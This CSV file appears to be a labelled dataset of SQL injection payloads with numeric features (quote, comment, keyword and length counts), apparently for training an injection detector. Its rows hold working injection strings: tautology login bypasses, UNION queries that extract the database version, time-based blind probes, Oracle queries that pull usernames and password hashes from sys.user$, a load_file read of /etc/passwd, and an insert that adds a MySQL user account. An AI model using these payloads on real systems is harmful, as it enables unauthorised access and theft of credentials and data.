Query,Label,query_len,num_words_query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  column_name  )   from   (  select distinct  (  column_name  )  , rownum as limit from all_tab_columns  )   where limit  =  5   )    )    and 'i'  =  'i",1,221,35,3,0,25,0,0,35,0,2,0,0,0,123,2,0,2
" select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",1,81,16,3,0,14,1,0,16,1,1,3,0,0,40,3,0,2
" select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
" select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
distinct,1,8,1,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0
select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',1,66,18,3,0,11,1,0,17,0,1,4,0,0,24,4,0,1
"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1,134,28,2,0,14,0,0,27,0,1,0,0,0,60,7,0,2
select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,1,58,16,0,0,7,1,0,15,0,2,3,0,0,26,4,0,1
"admin"" or ""1""  =  ""1""--",1,23,5,0,5,8,1,0,4,0,1,2,0,0,7,2,0,0
" select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,1,2,3,0,0,26,4,0,1
insert,1,6,1,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0
" select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",1,65,18,0,1,9,1,0,18,0,2,3,0,0,26,6,0,1
" select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,1,2,3,0,0,26,4,0,1
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  password  )   from   (  select distinct  (  password  )  , rownum as limit from sys.user$  )   where limit  =  8   )    )    and 'i'  =  'i",1,209,35,3,0,23,0,0,35,0,2,0,0,0,113,2,0,2
" select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
"or 1  =  1 or """"  =  ",1,21,7,0,2,4,0,0,7,0,1,0,0,0,4,2,0,0
/**/or/**/1/**/  =  /**/1,1,25,3,0,0,17,0,4,2,0,0,8,0,0,2,2,0,0
" select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
" select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",1,79,15,3,0,13,1,0,15,0,1,4,0,0,40,3,0,2
" select * from users where id  =  '1' union select +\.,@@version -- 1'",1,70,13,3,0,12,1,0,13,0,0,4,0,0,40,2,0,2
or 1  =  1/*,1,12,4,0,0,3,0,1,3,0,0,0,0,0,2,2,0,0
%27 or 1  =  1,1,14,5,0,0,2,0,0,4,1,1,0,0,0,2,4,0,0
" select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",1,78,16,0,0,11,1,0,16,0,0,3,0,0,40,3,0,2
" select * from users where id  =  '1' union select $*$,@@version -- 1'",1,70,13,3,0,13,1,0,13,0,0,4,0,0,40,2,0,2
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1,62,8,0,0,16,0,0,7,0,0,0,0,0,12,21,1,0
" select * from users where id  =  '1' or $ 1  =  1 union select 1,@@version -- 1'",1,81,18,3,0,12,1,0,18,0,1,3,0,0,42,5,0,2
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,1,58,16,0,0,7,1,0,15,0,2,3,0,0,26,5,0,1
" select * from users where id  =  '1' or \<\ union select 1,@@version -- 1'",1,75,15,3,0,11,1,0,15,0,1,3,0,0,42,3,0,2
" select * from users where id  =  1 union select 1||1,version  (    )   -- 1",1,76,15,0,0,9,1,0,15,0,1,3,0,0,40,4,0,2
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1,103,20,0,0,9,1,0,20,0,1,3,1,0,66,4,1,2
select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',1,61,16,3,0,10,1,0,15,0,2,3,0,0,26,4,0,1
" select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
" select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
" select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
or 1 --',1,8,3,1,0,3,1,0,2,0,0,2,0,0,2,1,0,0
" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
"admin"" or 1  =  1#",1,18,5,0,1,3,0,0,4,0,1,0,0,0,7,2,0,0
" select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",1,112,23,0,0,10,1,0,23,0,0,4,1,0,66,4,1,2
\x27union select,1,16,2,0,0,0,0,0,1,0,0,0,0,0,12,2,0,1
print,1,5,1,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0
" select * from users where id  =  '1' union select   (  \.  )  ,@@version -- 1'",1,79,16,3,0,13,1,0,16,0,0,3,0,0,40,2,0,2
or 1  =  1--,1,12,4,0,0,3,1,0,3,0,0,2,0,0,2,2,0,0
1 or pg_sleep  (  __time__  )  --,1,33,7,0,0,9,1,0,6,0,1,2,0,0,13,1,0,0
" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
admin'  )   or   (  '1'  =  '1'/*,1,33,7,5,0,10,0,1,6,0,1,0,0,0,7,2,0,0
or 2 between 1 and 3,1,20,6,0,0,0,0,0,5,0,1,0,0,0,12,3,0,0
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1,69,20,0,2,10,1,0,20,0,2,3,0,0,26,5,0,1
" select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",1,84,17,0,1,10,1,0,17,0,1,3,1,0,46,3,1,2
admin' or '1'  =  '1,1,20,5,4,0,5,0,0,4,0,1,0,0,0,7,2,0,0
; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,1,69,13,4,0,14,1,0,12,0,1,2,0,0,35,3,0,1
" select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1,96,19,0,0,7,1,0,19,0,0,3,0,0,62,4,0,2
""" or 0  =  0 --",1,15,6,0,1,4,1,0,5,0,1,2,0,0,2,2,0,0
" select * from users where id  =  1 union select @ $_,version  (    )   -- 1",1,76,16,0,0,10,1,0,16,0,0,3,0,0,40,2,0,2
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1,55,15,0,0,9,1,0,14,0,1,3,0,0,24,4,0,1
" select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,1,2,3,0,0,26,4,0,1
" select * from users where id  =  1 + $+*$ union select null,@@version -- 1",1,75,15,0,0,12,1,0,15,0,0,5,1,0,44,2,1,2
" select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
char%4039%41%2b%40select,1,24,1,0,0,4,0,0,0,4,0,0,0,0,11,9,1,0
" select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",1,59,16,0,2,8,1,0,16,0,2,3,0,0,26,5,0,1
admin'  )   or   (  '1'  =  '1,1,30,7,4,0,7,0,0,6,0,1,0,0,0,7,2,0,0
declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,1,62,11,0,0,8,0,0,10,0,0,0,0,1,24,10,1,1
"or 0  =  0 #""",1,13,5,0,1,3,0,0,4,0,0,0,0,0,2,2,0,0
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
  )   or   (  'x'  =  'x,1,24,6,3,0,6,0,0,6,0,1,0,0,0,4,0,0,0
" select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1,77,15,0,0,11,1,0,15,0,0,3,0,0,40,3,0,2
$  (  sleep 50  ) ,1,18,5,0,0,3,0,0,5,0,0,0,0,0,5,2,0,0
" select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",1,102,20,0,0,8,1,0,20,0,0,4,1,0,66,4,1,2
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1,76,12,2,0,11,1,0,11,0,0,2,0,0,43,7,0,1
" select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",1,83,17,2,1,12,1,0,17,0,1,3,0,0,43,3,0,2
" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1,84,17,0,1,10,1,0,17,0,1,3,1,0,46,3,1,2
" select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",1,59,16,0,1,8,1,0,16,0,2,3,0,0,26,5,0,1
"""a"""" or 1  =  1--""",1,18,5,0,4,7,1,0,4,0,1,2,0,0,3,2,0,0
" select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",1,99,20,0,0,8,1,0,20,0,0,4,0,0,62,5,0,2
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  column_name  )   from   (  select distinct  (  column_name  )  , rownum as limit from all_tab_columns  )   where limit  =  4   )    )    and 'i'  =  'i",1,221,35,3,0,25,0,0,35,0,2,0,0,0,123,2,0,2
" select * from users where id  =  '1' union select   (  \  )  ,@@version -- 1'",1,78,16,3,0,12,1,0,16,0,0,3,0,0,40,2,0,2
1 and user_name  (    )     =   'dbo',1,37,7,2,0,6,0,0,6,0,1,0,0,0,14,1,0,0
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",1,100,19,2,0,19,1,0,18,0,1,2,0,0,39,7,0,1
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",1,81,17,0,1,10,1,0,17,0,1,3,0,0,42,4,0,2
" select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",1,84,17,0,1,10,1,0,17,0,1,3,1,0,46,3,1,2
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1,58,16,3,0,11,1,0,15,0,1,4,0,0,24,4,0,1
select * from users where id  =  1 +$+. or 1  =  1 -- 1,1,55,15,0,0,9,1,0,14,0,1,5,0,0,24,4,0,1
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1,72,20,0,0,9,1,0,19,0,2,4,0,0,26,5,0,1
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  username  )   from   (  select distinct  (  username  )  , rownum as limit from sys.all_users  )   where limit  =  6   )    )    and 'i'  =  'i",1,213,35,3,0,23,0,0,35,0,2,0,0,0,117,2,0,2
or 1  =  1 or ''  =  ',1,22,8,3,0,5,0,0,7,0,1,0,0,0,4,2,0,0
select * from users where id  =  1   or 1  =  1 -- 1,1,52,14,0,0,5,1,0,13,0,1,3,0,0,24,4,0,1
or 'text' > 't',1,15,4,4,0,5,0,0,3,0,0,0,0,0,7,0,0,0
"1234 "" and 1  =  0 union all select ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,78,11,0,4,6,0,0,10,0,1,0,0,0,35,25,0,1
" select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,1,2,3,0,0,26,4,0,1
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",1,87,19,0,1,11,1,0,19,0,1,3,0,0,42,5,0,2
admin' or '1'  =  '1'#,1,22,5,5,0,7,0,0,4,0,1,0,0,0,7,2,0,0
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1,55,16,0,0,7,1,0,15,0,1,4,0,0,24,5,0,1
s,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  username  )   from   (  select distinct  (  username  )  , rownum as limit from sys.all_users  )   where limit  =  4   )    )    and 'i'  =  'i",1,213,35,3,0,23,0,0,35,0,2,0,0,0,117,2,0,2
 select * from information_schema.tables--,1,42,4,0,0,5,1,0,4,0,0,3,0,0,33,0,0,1
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
1   )    )    or pg_sleep  (  __time__  )  --,1,45,9,0,0,11,1,0,8,0,1,2,0,0,13,1,0,0
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1,78,15,3,0,13,1,0,15,0,1,3,0,0,40,2,0,2
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,1,62,11,0,0,8,0,0,10,0,0,0,0,1,24,10,1,1
 or 1  =  1 or ''  =  ',1,23,8,3,0,5,0,0,8,0,2,0,0,0,4,2,0,0
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1,55,15,0,0,8,1,0,14,1,2,3,0,0,24,5,0,1
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a0031003000270000 exec  (  @q  ) ,1,158,14,0,0,8,0,0,14,0,0,0,0,1,33,90,1,1
" select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",1,59,16,0,2,8,1,0,16,0,2,3,0,0,26,5,0,1
" select * from users where id  =  1 or $+<1 union select 1,@@version -- 1",1,73,15,0,0,10,1,0,15,0,1,4,0,0,42,4,0,2
or 'unusual'   =   'unusual',1,28,4,4,0,5,0,0,3,0,0,0,0,0,16,0,0,0
 or 1 in   (  select @@version  )  --,1,37,8,0,0,6,1,0,8,0,1,2,0,0,17,1,0,1
truncate,1,8,1,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0
as,1,2,1,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0
 or 3  =  3 --,1,15,6,0,0,3,1,0,5,0,1,2,0,0,2,2,0,0
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,100,20,0,0,9,1,0,20,0,1,3,0,0,62,5,0,2
" select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1,78,16,0,0,11,1,0,16,0,0,3,0,0,40,3,0,2
"admin""  )   or   (  ""1""  =  ""1",1,30,7,0,4,7,0,0,6,0,1,0,0,0,7,2,0,0
" select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",1,83,17,2,1,12,1,0,17,0,1,3,0,0,43,3,0,2
"1  )   or benchmark  (  10000000,md5  (  1   )    )   #",1,55,11,0,0,7,0,0,10,0,1,0,0,0,13,11,0,0
" select * from users where id  =  1 union select .1_,version  (    )   -- 1",1,75,15,0,0,9,1,0,15,0,0,3,0,0,40,3,0,2
 and 1  =  utl_inaddr.get_host_address   (    (   select sys.database_name from dual   )    )    and 'i'  =  'i,1,111,16,3,0,15,0,0,16,0,2,0,0,0,60,1,0,1
" or 0  =  0 #""",1,14,5,0,1,3,0,0,5,0,1,0,0,0,2,2,0,0
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1,55,16,0,0,7,1,0,15,1,1,3,0,0,24,5,0,1
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1,55,15,0,0,9,1,0,14,1,2,3,0,0,24,4,0,1
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",1,100,19,2,0,19,1,0,18,0,1,2,0,0,39,7,0,1
1  )   or sleep  (  __time__  )  #,1,34,8,0,0,8,0,0,7,0,1,0,0,0,11,1,0,0
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1,59,16,0,2,8,1,0,16,0,2,3,0,0,26,5,0,1
" select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1,78,16,0,0,10,1,0,16,0,0,3,0,0,40,4,0,2
" select * from users where id  =  1 + $+*\ union select null,@@version -- 1",1,75,15,0,0,11,1,0,15,0,0,5,1,0,44,2,1,2
select * from users where id  =  1. <@ or 1  =  1 -- 1,1,54,15,0,0,8,1,0,14,0,1,3,0,0,24,4,0,1
 or true--,1,10,2,0,0,2,1,0,2,0,1,2,0,0,6,0,0,0
; execute immediate 'sel' || 'ect us' || 'er',1,45,9,6,0,11,0,0,8,0,2,0,0,0,26,0,0,0
hi' or 'x'  =  'x';,1,19,5,5,0,7,0,0,4,0,1,0,0,0,6,0,0,0
select * from users where id  =  1 <@ or 1  =  1 -- 1,1,53,15,0,0,7,1,0,14,0,1,3,0,0,24,4,0,1
" select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
admin' #,1,8,2,1,0,2,0,0,1,0,0,0,0,0,5,0,0,0
" select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1,78,16,0,0,11,1,0,16,0,0,3,0,0,40,3,0,2
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
" select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
" union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1,55,7,2,0,12,0,0,7,0,0,2,0,0,28,4,0,1
"""  )  ;waitfor delay '0:0:__time__'--",1,37,5,2,1,13,1,0,4,0,0,2,0,0,16,2,0,0
 or 'unusual'   =   'unusual',1,29,4,4,0,5,0,0,4,0,1,0,0,0,16,0,0,0
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1,121,17,6,0,17,0,0,17,0,0,0,0,0,66,3,0,0
"admin"" or ""1""  =  ""1""/*",1,23,5,0,5,8,0,1,4,0,1,0,0,0,7,2,0,0
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1,69,20,0,2,9,1,0,20,0,2,3,0,0,26,6,0,1
" select * from users where id  =  1 or \<1 union select 1,@@version -- 1",1,72,15,0,0,8,1,0,15,0,1,3,0,0,42,4,0,2
like,1,4,1,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0
or username like char  (  37  )  ;,1,34,8,0,0,3,0,0,7,0,0,0,0,0,18,2,1,0
 )    )    or pg_sleep  (  __time__  )  --,1,42,8,0,0,11,1,0,8,0,1,2,0,0,13,0,0,0
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,1,58,16,0,0,8,1,0,15,0,2,4,0,0,26,4,0,1
or 3  =  3,1,10,4,0,0,1,0,0,3,0,0,0,0,0,2,2,0,0
" select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,1,72,20,0,0,10,1,0,19,0,2,4,0,0,26,5,0,1
exec sp,1,7,2,0,0,0,0,0,1,0,0,0,0,0,6,0,0,0
" select * from users where id  =  1 or \+<$ union select 1,@@version -- 1",1,73,15,0,0,10,1,0,15,0,1,4,0,0,42,3,0,2
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1,57,16,0,0,7,1,0,15,0,2,3,0,0,26,4,0,1
" select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",1,77,15,0,0,10,1,0,15,0,1,3,0,0,40,4,0,2
admin' or 1  =  1/*,1,19,5,1,0,4,0,1,4,0,1,0,0,0,7,2,0,0
a' waitfor delay '0:0:10'--,1,27,4,3,0,7,1,0,3,0,0,2,0,0,13,4,0,0
" select * from users where id  =  1 +  (  \  )   union select null,@@version -- 1",1,81,17,0,0,10,1,0,17,0,0,4,1,0,44,2,1,2
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1,76,15,0,0,10,1,0,15,0,0,3,0,0,40,3,0,2
and 1 in   (  select var from temp  )  --,1,41,10,0,0,4,1,0,9,0,0,2,0,0,22,1,0,1
hi'  )   or   (  'a'  =  'a,1,27,7,4,0,7,0,0,6,0,1,0,0,0,6,0,0,0
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  column_name  )   from   (  select distinct  (  column_name  )  , rownum as limit from all_tab_columns  )   where limit  =  1   )    )    and 'i'  =  'i",1,221,35,3,0,25,0,0,35,0,2,0,0,0,123,2,0,2
"admin"" or 1  =  1",1,17,5,0,1,2,0,0,4,0,1,0,0,0,7,2,0,0
"""  )   or true--",1,16,4,0,1,4,1,0,3,0,1,2,0,0,6,0,0,0
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@version -- 1'",1,81,18,3,0,13,1,0,18,0,1,3,0,0,42,4,0,2
" select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
1  )   or pg_sleep  (  __time__  )  --,1,38,8,0,0,10,1,0,7,0,1,2,0,0,13,1,0,0
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
"""  )   or sleep  (  __time__  )    =  """,1,39,9,0,2,10,0,0,8,0,1,0,0,0,11,0,0,0
select * from users where id  =  1.<@. or 1  =  1 -- 1,1,54,14,0,0,9,1,0,13,0,1,3,0,0,24,4,0,1
"admin""  )   or   (  ""1""  =  ""1""--",1,33,7,0,5,10,1,0,6,0,1,2,0,0,7,2,0,0
" select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",1,77,15,0,0,11,1,0,15,0,0,3,0,0,40,3,0,2
; exec xp_regread,1,17,3,0,0,2,0,0,2,0,0,0,0,0,13,0,0,0
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1,82,18,3,0,12,1,0,18,0,0,4,0,0,40,4,0,2
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1,57,16,0,0,8,1,0,15,1,1,5,0,0,24,5,0,1
" select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1,59,16,0,2,8,1,0,16,0,2,3,0,0,26,5,0,1
" select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,1,2,3,0,0,26,4,0,1
1 and 1  =  1,1,13,5,0,0,1,0,0,4,0,1,0,0,0,3,3,0,0
or 0  =  0 #,1,12,5,0,0,2,0,0,4,0,0,0,0,0,2,2,0,0
union select * from users where login   =   char ...,1,52,10,0,0,5,0,0,9,0,0,1,0,0,34,0,1,1
" select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1,76,15,0,0,10,1,0,15,0,1,3,0,0,40,3,0,2
admin'  )   or '1'  =  '1'--,1,28,6,5,0,9,1,0,5,0,1,2,0,0,7,2,0,0
1;select *,1,10,2,0,0,2,0,0,1,0,0,1,0,0,6,1,0,0
" select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,1,63,15,1,0,10,1,0,14,0,1,3,0,0,26,1,0,2
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1,84,17,3,2,14,1,0,17,0,1,3,0,0,42,3,0,2
" select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,103,20,3,0,12,1,0,20,0,1,3,0,0,62,5,0,2
"1 or benchmark  (  10000000,md5  (  1   )    )   #",1,50,10,0,0,6,0,0,9,0,1,0,0,0,13,11,0,0
procedure,1,9,1,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0
or ''  =  ',1,11,4,3,0,4,0,0,3,0,0,0,0,0,2,0,0,0
 and 1  =  utl_inaddr.get_host_address   (    (   select sys.login_user from dual   )    )    and 'i'  =  'i,1,108,16,3,0,15,0,0,16,0,2,0,0,0,57,1,0,1
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  username  )   from   (  select distinct  (  username  )  , rownum as limit from sys.all_users  )   where limit  =  2   )    )    and 'i'  =  'i",1,213,35,3,0,23,0,0,35,0,2,0,0,0,117,2,0,2
\'; desc users; --,1,18,4,1,0,5,1,0,3,0,0,2,0,0,9,0,0,0
" select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@version -- 1",1,87,19,0,0,11,1,0,19,0,1,3,0,0,42,4,0,2
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1,66,19,3,0,10,1,0,18,0,2,3,0,0,26,6,0,1
""" or """"^""",1,9,3,0,4,5,0,0,2,0,1,0,0,0,2,0,0,0
"""-""",1,3,1,0,2,3,0,0,0,0,0,1,0,0,0,0,0,0
" select * from users where id  =  1 or \<   =  1 union select 1,@@version -- 1",1,78,17,0,0,9,1,0,17,0,1,3,0,0,42,4,0,2
" select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1,76,15,0,0,10,1,0,15,0,0,3,0,0,40,3,0,2
" select * from users where id  =  1 *\ union select null,@@version -- 1",1,71,14,0,0,8,1,0,14,0,0,4,1,0,44,2,1,2
